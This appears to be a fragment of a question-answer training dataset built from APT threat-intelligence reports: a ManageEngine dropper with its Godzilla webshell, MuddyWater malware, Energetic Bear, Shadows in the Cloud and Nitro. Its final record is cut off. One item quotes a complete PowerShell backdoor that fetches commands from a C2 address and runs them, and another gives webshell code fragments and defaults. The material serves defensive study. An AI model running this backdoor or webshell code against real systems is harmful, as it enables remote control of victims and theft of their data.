    "instruction": "Medium Headline: ME_ADManager.exe Dropper\nAfter initial exploitation, the dropper is saved to the following path:\nc:\\Users\\[username]\\AppData\\Roaming\\ADManager\\ME_ADManager.exe\nAnalysis of this file revealed that the author of this payload did not remove debug symbols when building the sample. Thus, the following debug path exists within the sample and suggests the username pwn was used to create this payload:\nc: \\Users\\pwn\\documents\\visual studio 2015\\Projects\\payloaddll\\Release\\cmd.pdb\nUpon execution, the sample starts off by creating the following generic mutex found in many code examples freely available on the internet, which is meant to avoid running more than one instance of the dropper:\ncplusplus_me\nThe dropper then attempts to write a hardcoded Godzilla webshell, which we will provide a detailed analysis of later in this report, to the following locations:\n../webapps/adssp/help/admin-guide/reports.jsp\nc: /ManageEngine/ADSelfService Plus/webapps/adssp/help/admin-guide/reports.jsp\n../webapps/adssp/selfservice/assets/fonts/lato/lato-regular.jsp\nc: /ManageEngine/ADSelfService Plus/webapps/adssp/selfservice/assets/fonts/lato/lato-regular.jsp\nThe dropper then creates the folder %APPDATA%\\ADManager and copies itself to %APPDATA%\\ADManager\\ME_ADManager.exe before creating the following registry keys to persistently run after reboot:\nSoftware\\Microsoft\\Windows\\CurrentVersion\\Run\\ME_ADManager.exe : %APPDATA%\\ADManager\\ME_ADManager.exe Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ME_ADAudit.exe : %SYSTEM32%\\ME_ADAudit.exe\nThe dropper then copies ADAudit.exe from the current directory to the following path and runs the file with WinExec:\n%SYSTEM32%\\ME_ADAudit.exe\nThe dropper does not write the ME_ADAudit.exe file to disk, meaning the threat actor must upload this file to the server prior to the execution of the dropper, likely as part of the initial exploitation of the (<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40539>)CVE-2021-40539 vulnerability. During our analysis of multiple incidents, we found that the ME_ADAudit.exe sample maintained a consistent SHA256 hash of 805b92787ca7833eef5e61e2df1310e4b6544955e812e60b5f834f904623fd9f, therefore suggesting that the actor deployed the same customized version of the NGLite backdoor against multiple targets.\nAs mentioned previously, the initial dropper contains a Java Server Page (JSP) webshell hardcoded within it. Upon analysis of the webshell, it was determined to be the Chinese-language  webshell V3.00+. The Godzilla webshell was developed by user BeichenDream, who stated they created this webshell because the ones available at the time would frequently be detected by security products during red team engagements. As such, the author advertises it will avoid detection by leveraging AES encryption for its network traffic and that it maintains a very low static detection rate across security vendor products.\nIt's no surprise that the Godzilla webshell has been adopted by regional threat groups during their intrusions, as it offers more functionality and network evasion than other webshells used by the same groups, such as (<https://unit42.paloaltonetworks.com/tag/china-chopper/>)ChinaChopper.\nThe JSP webshell itself is fairly straightforward in terms of functionality and maintains a lightweight footprint. Its primary function is to parse an HTTP POST, decrypt the content with the secret key and then execute the payload. This allows attackers to keep code likely to be flagged as malicious off the target system until they are ready to dynamically execute it.\nThe below image shows the initial part of the default JSP webshell as well as the decrypt function.\nOf note are the variables xc and pass in the first and second lines of the code shown in Figure 2. These are the main components that change each time an operator generates a new webshell, and the variables represent the secret key used for AES decryption within that webshell.\nWhen you generate the webshell manually, you specify a plaintext pass and key. By default, these are pass and key.\nTo figure out how these are presented in the webshell itself, we can take a look at the Godzilla JAR file.\nBelow, you can see the code substitutes the strings in one of the embedded webshell templates under the /shells/cryptions/JavaAES/GenerateShellLoder function.\nThus we know the xc variable in the webshell will be the AES secret key, as indicated in the template.\nString xc=\"{secretKey}\"; String pass=\"{pass}\"; String md5=md5(pass+xc);\nWe observed that the xc value appears to be a hash, and under the /core/shell/ShellEntity.class file, we can see the code takes the first 16 characters of the MD5 hash for a plaintext secret key.\npublic String getSecretKeyX()\n{\nreturn functions.md5(getSecretKey()).substring(0, 16);\n}\nWith that, we know then that the xc value of 3c6e0b8a9c15224a is the first 16 characters of the MD5 hash for the word key.\nGiven this, the xc and pass variables are the two primary fields that can be used for tracking and attempting to map activity across incidents. For the purpose of this blog, we generated a Godzilla webshell with the default options for analysis; however, the only differences between the default one and the ones observed in attacks are different xc and pass values.\nOne important characteristic of this webshell is that the author touts the lack of static detection and has tried to make this file not stand out through avoiding keywords or common structures that might be recognized by security product signatures. One particularly interesting static evasion technique is the use of a Java ternary conditional operator to indicate decryption.\nThe conditional here is m?1:2 \u2013 m is a boolean value passed to this function, as shown previously in Figure 2. If m is True, then the first expression constant (1) is used. Otherwise, the second (2) is passed. Referring to the Java documentation, 1 is ENCRYPT_MODE, whereas 2 is DECRYPT_MODE.\nWhen the webshell executes this function x, it does not set the value of m, thus forcing m to False and setting it to decrypt.\nresponse.getWriter().write(base64Encode(x(base64Decode(f.toString()), true)));\nTo understand the capabilities of Godzilla then, we can take a look in /shells/payloads/java/JavaShell.class. This class file contains all of the functions provided to the operator. Below is an example of the getFile function.\nPayload functions:\ngetFile downloadFile\ngetBasicsInfo uploadFile copyFile deleteFile\nnewFile\nnewDir\ncurrentDir\ncurrentUserName\nbigFileUpload bigFileDownload getFileSize execCommand\ngetOsInfo moveFile\ngetPayload fileRemoteDown\nsetFileAttr\nAs evidenced by the names of the functions, the Godzilla webshell offers numerous payloads for navigating remote systems, transferring data to and from, remote command execution and enumeration.\nThese payloads will be encrypted with the secret key previously described, and the operating software will send an HTTP POST to the compromised system containing the data.\nAdditionally, if we examine the core/ui/component/dialog/ShellSetting.class file (shown below), the initAddShellValue() function contains the default configuration settings for remote network access. Therefore, elements such as static HTTP headers and User-Agent strings can be identified in order to aid forensic efforts searching web access logs for potential compromise.\nprivate void initAddShellValue() {\nthis.shellContext = new ShellEntity();\nthis.urlTextField.setText(\"http://127.0.0.1/shell.jsp\"); this.passwordTextField.setText(\"pass\"); this.secretKeyTextField.setText(\"key\"); this.proxyHostTextField.setText(\"127.0.0.1\"); this.proxyPortTextField.setText(\"8888\"); this.connTimeOutTextField.setText(\"60000\"); this.readTimeOutTextField.setText(\"60000\"); this.remarkTextField.setText(\"??\"); this.headersTextArea.setText(\"User-Agent: Mozilla/5.0 (Windows NT\n10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\\n\"); this.leftTextArea.setText(\"\"); this.rightTextArea.setText(\"\");\n}\nTo illustrate, below is a snippet of the web server access logs that show the initial exploit using the Curl application and sending the custom URL payload to trigger the CVE-2021-40539 vulnerability. It then shows the subsequent access of the Godzilla webshell, which has been placed into the hardcoded paths by the initial dropper. By reviewing the User-Agent, we can determine that the time from exploit to initial webshell access took just over four minutes for the threat actor.\n- /./RestAPI/LicenseMgr \"-\" X.X.X.X Y.Y.Y.Y POST [00:00:00] - - 200 \"curl/7.68.0\"\n- /help/admin-guide/reports.jsp \"-\" X.X.X.X Y.Y.Y.Y POST [+00:04:07] - - 200 \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0\"\nRead the text above and answer this question: Explain the role of the Godzilla webshell in the context of the ME_ADManager.exe dropper. How is it deployed and what are its primary functions?",
    "output": "The Godzilla webshell plays a crucial role in the ME_ADManager.exe dropper's operations. After initial exploitation, the dropper writes a hardcoded Godzilla webshell to several predefined locations, such as '../webapps/adssp/help/admin-guide/reports.jsp' and 'c:/ManageEngine/ADSelfService Plus/webapps/adssp/help/admin-guide/reports.jsp'. The primary functions of the Godzilla webshell include parsing an HTTP POST request, decrypting the content with a secret key, and then executing the payload. This allows attackers to keep potentially malicious code off the target system until they are ready to dynamically execute it, thereby evading detection. The webshell offers numerous payloads for navigating remote systems, transferring data, remote command execution, and enumeration.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: TECHNICAL DETAILS\nFBI, CISA, CNMF, and NCSC-UK have observed the Iranian government-sponsored MuddyWater APT group employing spearphishing, exploiting publicly known vulnerabilities, and leveraging multiple open-source tools to gain access to sensitive government and commercial networks.\nAs part of its spearphishing campaign, MuddyWater attempts to coax their targeted victim into downloading ZIP files, containing either an Excel file with a malicious macro that communicates with the actor's C2 server or a PDF file that drops a malicious file to the victim's network [, ]. MuddyWater actors also use techniques such as side-loading DLLs [] to trick legitimate programs into running malware and obfuscating PowerShell scripts [] to hide C2 functions [] (see the PowGoop section for more information).\nAdditionally, the group uses multiple malware sets\u2014including PowGoop, Small Sieve, Canopy/Starwhale, Mori, and POWERSTATS\u2014for loading malware, backdoor access, persistence [], and exfiltration []. See below for descriptions of some of these malware sets, including newer tools or variants to the group's suite. Additionally, see Malware Analysis Report for further details.\nMedium Headline: PowGoop\nMuddyWater actors use new variants of PowGoop malware as their main loader in malicious operations; it consists of a DLL loader and a PowerShell-based downloader. The malicious file impersonates a legitimate file that is signed as a Google Update executable file.\nAccording to samples of PowGoop analyzed by and , PowGoop consists of three components:\n\u2022 A DLL file renamed as a legitimate filename, Goopdate.dll, to enable the DLL side-loading technique []. The DLL file is contained within an executable, GoogleUpdate.exe.\n\u2022 A PowerShell script, obfuscated as a .dat file, goopdate.dat, used to decrypt and run a second obfuscated PowerShell script, config.txt [].\n\u2022 config.txt, an encoded, obfuscated PowerShell script containing a beacon to a hardcoded IP address.\nThese components retrieve encrypted commands from a C2 server. The DLL file hides communications with MuddyWater C2 servers by executing with the Google Update service.\nMedium Headline: Small Sieve\nAccording to a sample , Small Sieve is a simple Python [] backdoor distributed using a Nullsoft Scriptable Install System (NSIS) installer, gram_app.exe. The NSIS installs the Python backdoor, index.exe, and adds it as a registry run key [], enabling persistence [].\nMuddyWater disguises malicious executables and uses filenames and Registry key names associated with Microsoft's Windows Defender to avoid detection during casual inspection. The APT group has also used variations of Microsoft (e.g., \"Microsift\") and Outlook in its filenames associated with Small Sieve [].\nSmall Sieve provides basic functionality required to maintain and expand a foothold in victim infrastructure and avoid detection [] by using custom string and traffic obfuscation schemes together with the Telegram Bot application programming interface (API). Specifically, Small Sieve's beacons and taskings are performed using Telegram API over Hypertext Transfer Protocol Secure (HTTPS) [], and the tasking and beaconing data is obfuscated through a hex byte swapping encoding scheme combined with an obfuscated Base64 function [], ].\nNote: cybersecurity agencies in the United Kingdom and the United States attribute Small Sieve to MuddyWater with high confidence.\nSee Appendix B for further analysis of Small Sieve malware.\nMedium Headline: Canopy\nMuddyWater also uses Canopy/Starwhale malware, likely distributed via spearphishing emails with targeted attachments []. According to two Canopy/Starwhale samples analyzed by CISA, Canopy uses Windows Script File (.wsf) scripts distributed by a malicious Excel file. Note: the cybersecurity agencies of the United Kingdom and the United States attribute these malware samples to MuddyWater with high confidence.\nIn the samples CISA analyzed, a malicious Excel file, Cooperation terms.xls, contained macros written in Visual Basic for Applications (VBA) and two encoded Windows Script Files. When the victim opens the Excel file, they receive a prompt to enable macros []. Once this occurs, the macros are executed, decoding and installing the two embedded Windows Script Files.\nThe first .wsf is installed in the current user startup folder [] for persistence. The file contains hexadecimal (hex)-encoded strings that have been reshuffled []. The file executes a command to run the second .wsf.\nThe second .wsf also contains hex-encoded strings that have been reshuffled. This file collects [] the victim system's IP address, computer name, and username []. The collected data is then hex-encoded and sent to an adversary-controlled IP address, http[:]88.119.170[.]124, via an HTTP POST request [].\nMedium Headline: Mori\nMuddyWater also uses the Mori backdoor that uses Domain Name System tunneling to communicate with the group's C2 infrastructure [].\nAccording to one sample analyzed by CISA, FML.dll, Mori uses a DLL written in C++ that is executed with regsvr32.exe with export DllRegisterServer; this DLL appears to be a component to another program. FML.dll contains approximately 200MB of junk data [] in a resource directory 205, number 105. Upon execution, FML.dll creates a mutex, 0x50504060, and performs the following tasks:\n\u2022 Deletes the file FILENAME.old and deletes file by registry value. The filename is the DLL file with a .old extension.\n\u2022 Resolves networking APIs from strings that are ADD-encrypted with the key 0x05.\n\u2022 Uses Base64 and Java Script Object Notation (JSON) based on certain key values passed to the JSON library functions. It appears likely that JSON is used to serialize C2 commands and/or their results.\n\u2022 Communicates using HTTP over either IPv4 or IPv6, depending on the value of an unidentified flag, for C2 [].\n\u2022 Reads and/or writes data from the following Registry Keys, HKLM\\Software\\NFC\\IPA and HKLM\\Software\\NFC\\(Default).\nMedium Headline: POWERSTATS\nThis group is also known to use the POWERSTATS backdoor, which runs PowerShell scripts to maintain persistent access to the victim systems [].\nCNMF has posted samples further detailing the different parts of MuddyWater's new suite of tools\u2014 along with JavaScript files used to establish connections back to malicious infrastructure\u2014to the malware aggregation tool and repository, . Network operators who identify multiple instances of the tools on the same network should investigate further as this may indicate the presence of an Iranian malicious cyber actor.\nMuddyWater actors are also known to exploit unpatched vulnerabilities as part of their targeted operations. FBI, CISA, CNMF, and NCSC-UK have observed this APT group recently exploiting the Microsoft Netlogon elevation of privilege vulnerability () and the Microsoft Exchange memory corruption vulnerability (). See for additional vulnerabilities with known exploits and joint Cybersecurity Advisory: for additional Iranian APT group-specific vulnerability exploits.\nMedium Headline: Newly Identified PowerShell Backdoor\nThe newly identified PowerShell backdoor used by MuddyWater below uses a single-byte Exclusive-OR (XOR) to encrypt communications with the key 0x02 to adversary-controlled infrastructure. The script is lightweight in functionality and uses the InvokeScript method to execute responses received from the adversary.\nfunction encode($txt,$key){$enByte = [Text.Encoding]::UTF8.GetBytes($txt);for($i=0; $i -lt $enByte.count ; $i++){$enByte[$i] = $enByte[$i] -bxor $key;}$encodetxt = [Convert]::ToBase64String($enByte);return $encodetxt;}function decode($txt,$key){$enByte = [System.Convert]::FromBase64String($txt);for($i=0; $i -lt $enByte.count ; $i++){$enByte[$i] = $enByte[$i] -bxor $key;}$dtxt = [System.Text.Encoding]::UTF8.GetString($enByte);return $dtxt;}$global:tt=20;while($true){try{$w = [System.Net.HttpWebRequest]::Create('http[:]//95.181.161[.]49:80/index.php?id=<vi ctim identifier>');$w.proxy = [Net.WebRequest]::GetSystemWebProxy();$r=(New-Object\nSystem.IO.StreamReader($w.GetResponse().GetResponseStream())).ReadToEnd();if($r.L\nength -gt 0){$res=[string]$ExecutionContext.InvokeCommand.InvokeScript(( decode $r 2));$wr =\n[System.Net.HttpWebRequest]::Create('http[:]//95.181.161[.]49:80/index.php?id=<vi ctim identifier>');$wr.proxy =\n[Net.WebRequest]::GetSystemWebProxy();$wr.Headers.Add('cookie',(encode $res\n2) );$wr.GetResponse().GetResponseStream();}}catch {}Start-Sleep -Seconds $global:tt;}\nMedium Headline: Identity and Access Management\n\u2022 Use multifactor authentication where possible, particularly for webmail, virtual private networks, and accounts that access critical systems.\n\u2022 Limit the use of administrator privileges. Users who browse the internet, use email, and execute code with administrator privileges make for excellent spearphishing targets because their system\u2014once infected\u2014enables attackers to move laterally across the network, gain additional accesses, and access highly sensitive information.\n\nDescribe the components and functionality of the PowGoop malware used by MuddyWater, and how does it facilitate communication with the C2 server?",
    "output": "A: PowGoop malware consists of three components: a DLL file renamed as Goopdate.dll to enable the DLL side-loading technique, a PowerShell script obfuscated as goopdate.dat, and config.txt, an encoded, obfuscated PowerShell script containing a beacon to a hardcoded IP address. These components retrieve encrypted commands from a C2 server. The DLL file hides communications with MuddyWater C2 servers by executing with the Google Update service, making it difficult to detect.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Scarred Manticore APT group utilize Hijack Execution Flow: DLL Search Order Hijacking in their attacks, specifically in regards to the LIONTAIL and LIONHEAD malware?",
    "output": "Hijack Execution Flow: DLL Search Order Hijacking is a technique used by adversaries to execute their own malicious payloads by hijacking the search order used to load DLLs. In the case of the Scarred Manticore APT group, they utilize a specific type of DLL search order hijacking called phantom DLL hijacking, where they target references to non-existent DLL files. The LIONTAIL and LIONHEAD malware are installed as services using this technique, allowing the attackers to load their own malicious DLLs. This is evident in the LIONHEAD web forwarder, which is installed as a service using the same phantom DLL hijacking technique as LIONTAIL. By hijacking the DLL search order, the attackers can execute their malicious payloads at a higher privilege level, potentially allowing for privilege escalation and evasion of restrictions on file execution.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Energetic Bear/ Dragonfly/ Havex Crouching Yeti/ Koala Team\nSince 2011, Energetic Bear, an Eastern European threat actor, has targeted the Defense Industry, Energy Industry, and ICS equipment manufacturers, with highly technical prolonged attacks that are suggestive of a state sponsor. Energetic Bear's exploit kit features specialized malware, likely developed or adapted by the attackers, that was compiled during business hours (Monday \u2013 Friday, 9am \u2013 6pm) UTC+4, which corresponds to working hours in Russia or Eastern Europe. Most security firms conclude that Energetic Bear is a Russian state-sponsored group because the group targets nation states who are politically opposed to Russia. Further, the malware primarily compromises petroleum and energy systems that compete with Russia's energy complex in the economical arena.\nBased on its choice of targets and the malware deployed, Energetic Bear seems primarily interested in gathering intelligence on its victims or their country of origin and establishing persistent access to compromised systems. The sophisticated exploit kit could easily be used to sabotage targets' operations to cause damage or disruption in critical infrastructure sectors that depend on ICS and SCADA systems. So far, while the malware has been positioned ideally to sabotage ICS and SCADA systems, investigations by Symantec and other leading firms witness more uses of the exploit kit for espionage purposes than the sabotage purposes. The threat actors may prefer not to utilize this capability or sabotage campaigns may occur, appearing as system failures that are not investigated as cyber-attacks. More likely, Energetic Bear may be pre-positioning its malware in compromised systems to grant the greatest utility while allowing for every attack vector. Given its selection of targets and its exploit kit, both of which are detailed below, Energetic Bear is uniquely positioned to assist in a combination of Digital and Physical warfare for military or political purposes. Notably, Russia conducted such a campaign in its 2008 conflict with Georgia.\nWhen Energetic Bear was discovered in 2011, the group targeted aviation and defense companies in the United States and Canada; however, in 2013, energy firms in the United States and Europe became the primary targets of Energetic Bear. In particular, the exploit kit targets the systems of ICS equipment manufacturers and petroleum pipeline operators. Energy grid operators, electricity generation facilities, and industrial equipment providers are also susceptible to compromise. By ingeniously targeting the smaller, less protected ICS manufacturing companies and antiquated SCADA systems, Energetic Bear is able to circumnavigate the massive state-sponsored cyber-security systems that typically protect critical infrastructure systems.\nThe exploit kit mimics the Stuxnet worm (which monitored and sabotaged the Iranian Nuclear program in 2011) in potential impact. If the sabotage potential of the malware were realized, then Energetic Bear could disrupt and seriously damage energy supply and regulation systems in countries such as: the United States, Spain, France, Germany, Turkey, and Poland. Consider the tragedy that a malicious actor could wrought with the ability to remotely destroy oilrigs, energy generation facilities, or electrical grids. The smallest citywide power outage has the potential to result in many deaths related to loss in electricity needed for in-home medical care, heating, and other technologies that assist in citizens' daily lives. Even if an attack is controlled well enough or mitigated soon enough to prevent serious physical damage to the facility, imagine the economic ramifications that the actor could inflict upon a nation state through repeated targeted attacks on its energy systems. The gas price hikes of the mid 2000's might seem a minor inconvenience in comparison to the damage caused by a persistent sabotage campaign.\nFrom February to June 2013, Energetic Bear launched a spam campaign against the United States and European energy sectors. Executives and senior employees in seven organizations received emails, sent from a Gmail account, containing a malicious pdf. If the pdf was opened, then the malware spread to the network. The emails were made to look as if they came from a known source (such as the victims' boss) and organizations were targeted with anywhere between 1 and 84 emails. In a more ambitious spear phishing campaign, emails containing remote access Trojans (RATs) were sent to personnel in three ICS equipment manufacturers who dominated their markets. The malware injected malicious code into the ICS software update bundles that were later posted for download from the manufacturer's website. The targeted equipment which would receive the update are used in a number of sectors, including energy. The Trojan managed to compromise the bundles of two companies and infect the programmable logic controllers of devices produced by those manufacturers, before the infection was discovered.\nLater, watering hole attacks were added to the campaign. In these attacks, websites often visited by personnel of the target organization were compromised (usually with an injected iframe) and set to redirect victims to a site that delivered an exploit kit that installed the malware on the victim's PC. The development of additional attack vector(s) and the resources to compromise third party sites as \"stepping stones\" to desired targets suggests that the group is state sponsored. In either attack, the malware was configured to search victims' systems for ICS software and updates and to trojanize the software so that the adversaries could compromise guarded ICS systems the next time the software was downloaded or they were updated by trusted personnel.\nThe group employs two exploit kits (LightOut and Hello) and two malware (Trojan.Karagany and Backdoor.Oldrea). The exploit kits are used to initially compromise the system and install the malware. The malware is used for espionage, persistent access, or sabotage. LightsOut exploits vulnerabilities in Java or in Microsoft Internet Explorer to deploy the Karagany or Oldrea malware onto a user's system. In September 2013, the Hello exploit kit replaced the LightsOut kit. The Hello kit is combined with watering hole attacks to redirect victims to a landing page, where a JavaScript fingerprints their system to determine details such as operating system, browser, and installed plugins. The victim is then redirected to the site that contains the exploit most likely to achieve the adversaries' goals.\nTrojan.Karagany and Backdoor.Oldrea are remote access Trojans (RATs) that are used to install additional tools or malware, to search the system for valuable data, and to exfiltrate data from the system. In an attack, the group uses either Karagany or Oldrea, but never both, because the malware serve the same purpose. The Karagany malware is only used in 5% of attacks. Karagany is a widely available exploit for purchase or source code recompilation on the internet underground because its code was leaked in 2010. Karagany features tools for indexing documents, taking screenshots of the system, and collecting passwords. At the adversary's instruction, it can also download new tools or files, run plugins or executables, or exfiltrate data to a designated C&C server. Oldrea, also widely known as the Havex malware, appears to be used in most attacks and it appears to have been written by or written for the attackers. Once installed, Oldrea profiles the system by collecting system information, harvesting outlook address book information, noting VPN configuration files, and indexing files, programs, and the root of available drives. The data is compiled into a temporary file, encrypted, and sent to an adversary C&C server. Oldrea features a control panel that the adversaries can use to authenticate to a C&C server and download a compressed copy of each specific victim's data. The servers hijacked by Energetic Bear to serve as C&C servers may have been compromised using the same exploit of content management systems.\nAnswer this question: Describe the tactics used by Energetic Bear in their 2013 campaign against the United States and European energy sectors. How did these tactics evolve over time?",
    "output": "In their 2013 campaign, Energetic Bear employed a spam campaign targeting executives and senior employees in energy sectors with malicious PDFs disguised as legitimate emails. They also conducted spear phishing attacks against ICS equipment manufacturers, injecting malicious code into software updates. Later, the group added watering hole attacks, compromising frequently visited websites to redirect victims to sites delivering exploit kits. This evolution showcases the group's adaptability and resourcefulness, moving from direct email attacks to more indirect methods like watering holes, indicating a state-sponsored level of support and planning.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: 5.3 Notification\nInvestigations of malware activity, such as that undertaken as part of the Shadow and GhostNet investigations, can yield information about the network infrastructure of the attackers, information about those who have been compromised, and confidential or private documents or other data that may have been exfiltrated without prior knowledge. Access to this information on all levels raises a number of practical, ethical and legal issues, many of which are unclear given the embryonic nature of the field of inquiry as a whole.\nThroughout this investigation, we have been conscious of these issues and have attempted to meet a professional standard in terms of planning and documenting our steps taken in the process of notification. This entailed research into existing practices and principles, and engagement with the law enforcement, intelligence and security communities in a number of countries. We were also conscious of the need to comply with the domestic laws in whose context this investigation was undertaken \u2014 namely those of India, the United States and Canada \u2014 as well as principles governing all academic research at the University of Toronto, where the Citizen Lab is located.\nNotification itself can be broken down into several categories, each of which entails complicating factors. First, there is notification that is required to takedown the command and control infrastructure, typically to the hosting and service provider companies through which the malware networks operate and on which they are hosted. Complicating matters, these services can be located in numerous national jurisdictions and subject to a variety of privacy laws and norms. Second, there are issues around notification of victims, such as governments, businesses, NGOs and individuals. This type of notification is perhaps the most challenging on ethical, practical and legal grounds. Notification of governments, for example, can be a very sensitive matter, especially if classified documents are involved or information is retrieved that is relevant to national security concerns. The same holds true of notification to individuals or businesses. At what point should a researcher notify a victim? Who within the organization, whether it is a government, a business or an NGO, is the appropriate point of contact for the notification? What if the notification jeopardizes a third party's security, or leads to some kind of retaliation or retribution? Should researchers notify law enforcement and intelligence agencies in their own countries before reaching out to foreign governments?\nExisting practices in this area are underdeveloped and largely informal. In part, this reflects the fact that global cyber security is still an embryonic field. But it also speaks to the very real problem of competitive power politics at the highest levels of national security, which tend to restrict information sharing in sensitive areas around cyber crime and espionage. Generally speaking, information sharing among law enforcement and intelligence agencies across borders is tentative at best, with the exception of that which occurs among close allies with deeply entrenched and long-standing links. Outside of those security communities, notification of services and governments tends to be restricted to specialist technical communities, telecommunications operators, and network administrators, if it occurs at all. Consequently, notification of the types referred to above can be ad hoc and inconsistent, largely contingent on the informal connections among professional communities.\nAll of these issues were grappled with in the aftermath of the Tracking GhostNet report, and throughout the course of the Shadow investigation. Our experiences in the aftermath of GhostNet, where notification was left incomplete, prompted a more deliberate and self-conscious approach with the Shadow investigation. We were also fortunate to have within our collaboration the experiences of the Shadowserver Foundation, whose counsel on notification helped in making decisions about timing and contacts.\nBy the end of November 2009, we were confident in our access to the basic command and control infrastructure and identification of some of the key documents at hand. Upon the realization that some information about individual Canadians was compromised, we notified Canadian authorities in December 2009 about the investigation, the compromise of Canadian-related information, and requested assistance on outreach with one of the victims, namely the Indian government. At the same time, we independently explored whom we might contact in the Indian government, including making inquiries with Canada's Department of Foreign Affairs. By February 2010, we were able to find on our own what we thought was an appropriate contact in the Indian government, and gave a detailed notification to the National Technology Research Organization. Our notification for takedown of the command and control infrastructure came later in the investigation, after we had collected and analyzed all of the information related to this report, but prior to its release.\nOur experiences illustrate the intricate, nuanced and often confusing landscape of global cyber security notification practices. The notification process will continue after the publication of this report.\nShadows in the Cloud points to a disturbing complex ecosystem of malware. Although malware networks, cyber crime and espionage have been around for years, the evidence presented here shows how these networks can be aggressively adaptive systems, multipying and regenerating across multiple vectors and platforms, and exploting the vulnerabilties within the latest Web 2.0 technologies to expand their reach and impact. Although there is rich detail to what is uncovered in the Shadow investigation, so much of the origins, architecture and aims of these networks ultimately remain a mystery and await further investigation and analysis. However, even with the partial insights and fleeting glimpses acquired here, we can draw some conclusions and implications for further research, policy and operations.\nFirst, the research here shows, as with Tracking GhostNet, how even a relatively small research sample \u2014 in this case Tibetan organizations \u2014 can expand, upon investigation and analysis, into an astonishingly large pool of victims. The connections drawn out here beg the question of what would emerge if the research began with a different group, from a different region of the world, with a different target set of compromised actors? Clearly, an area of methodological advantage for both the Tracking GhostNet and the Shadows in the Cloud investigations was to have access in the field to compromised computers and be able to work outwards in a structured and systematic fashion, using a combination of technical investigations and data analysis. An area of further research is to extend such efforts to other locations in other regions of the world. Such investigations may reveal other malware networks, or entirely new and unanticipated modes of crime and espionage.\nSecond, Shadows in the Cloud underscores the extent to which the global networked society into which we have evolved socially, politically, economically, and militarily carries with it an underground ecoystem that is equally networked, though far less visible to those whom it compromises. Governments, organizations and other actors around the world have been quick to adopt computerized public and administration systems, including state security actors. Their investments into these technologies have developed at a much faster rate than the appropriate security policies and practices (Deibert and Rohozinski 2010).\nAlthough the Government of India was the most victimized according to what we uncovered in Shadows in the Cloud \u2014 and that certainly should yield a major consideration of public policy and security for that country \u2014 observations about India in this respect need to be qualified in at least two ways. First, Shadows in the Cloud reports only on observations and existing evidence, which by definition remain partial. There could be other countries victimized, involving these very same malware networks attackers, but of which we are unaware because of our limited samples. Second, and most importantly, there are numerous other countries and international organizations that are targeted here, perhaps not to the same extent, but targeted and infiltrated nonetheless. We can only infer what type of data was exfiltrated from these other actors that is of strategic value. Overall, however, the key point to draw is that networked societies can be compromised through networks in which they are invariably linked and mutually dependent.\nThird, and related, Shadows in the Cloud demonstrates clearly the potential for collateral compromise, one of the key hypotheses informing our research framework. This investigation indicates that data leakage from malware networks can compromise unwitting third parties who are not initially targeted by the attackers. Data contained on compromised machines can also contain valuable information on third parties that while on its own may not be significant, but when pieced together with other information can provide actionable and operational intelligence. The policy and operational implications of collateral compromise are serious and wide-ranging, and reinforce that security is only as strong as the weakest link in a chain. In today's networked world, such chains are complex, overlapping and dispersed across numerous technological platforms crossing multiple\nnational jurisdictions. Paying attention to domestic cyber security is therefore only a partial solution to a much wider problem. Today, no country or organization is a secure island in the global sea of information.\n\nWhat challenges did the authors face when notifying governments, businesses, NGOs, and individuals about being compromised by the Shadow APT, and how did they address these challenges?",
    "output": "The authors faced challenges such as the sensitivity of notifying governments about classified documents or national security concerns, identifying the appropriate point of contact within organizations, and the potential for jeopardizing third-party security or causing retaliation. They addressed these challenges by conducting thorough research, seeking counsel from organizations like the Shadowserver Foundation, and making deliberate and self-conscious decisions about timing and contacts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Table 1\nThe next sample we found is commonly known as PCClient, which is not malware previously tied to this group. We discovered this, and many of the following samples, through historic IP resolution overlap between the same domains alternately resolving to either the 223.25.233.248 or 196.45.144.12. The second IP has also not been reported as tied to this group before. However, this shifting of IP resolutions back and forth indicates Nitro is in control of these domains. It also makes is fairly easy for any Infosec team to reach the same conclusion we did, which again negates their use both of a previously unreported domain and IP for C2, as well as a new family of malware. 25 AV vendors within VirusTotal properly classify this sample as malware. Its PE timestamp was 8 July, almost a week prior when we first saw it.\nBig Headline: Table 3\nThe next wave of activity we found took place in mid-May. Both samples were Spindest variants with the same PE timestamp of 15 May. While neither MD5s for C2 match, the aforementioned link to a post by Cyber Squared's TCIRT did document Nitro using Spindest variants with the same file name starting late December last year. In that case they used the historic C2 IP we note in Table 1 in this blog. 34 AV vendors within VirusTotal properly classify the first sample as malware, and 40 AV Vendors the second sample.\nBig Headline: Table 4\nThe malware dropped was configured to use good.myftp[.]org as the C2 URL, and the IP resolution was 223.25.233.248. Both of these are known Nitro Indicators of Compromise (IOCs). In this case, the malware was a Farfli variant, again not a malware previously tied to this group. 39 AV vendors within VirusTotal properly identify the file as malware. The PE timestamp on the file was 1 April, about two\nweeks before we saw the file. Continuing the activity, we discovered the actors had compromised a legitimate website belonging to an international technology company that provides Software Configuration and Change Management (SCCM) solutions in mid-May. (It is a well regarded company and partners with large companies such as Microsoft.)\nBig Headline: Table 6\nThe final sample, from mid-March, was also hosted on a compromised legitimate website, this time a small, US based IT company. The IP resolved by the C2 URL was changed two days after we saw this file to overlap with good.myftp[.]org for a month before returning the below resolution. The filename matches that of the sample in Table 5, which had a very similar third level C2 domain and the same IP resolution. This is also a Spindest variant with a PE timestamp of the same day we saw it. 39 AV vendors within VirusTotal properly identify the file as malware.\nBig Headline: Table 7\nAs this post and previous cited research show, APT groups such as Nitro will continue to evolve their techniques within the kill chain to avoid detection. However, they also demonstrate the value of tracking these threats over time, as this allowed us to uncover and properly attribute the new IOCs because Nitro was still 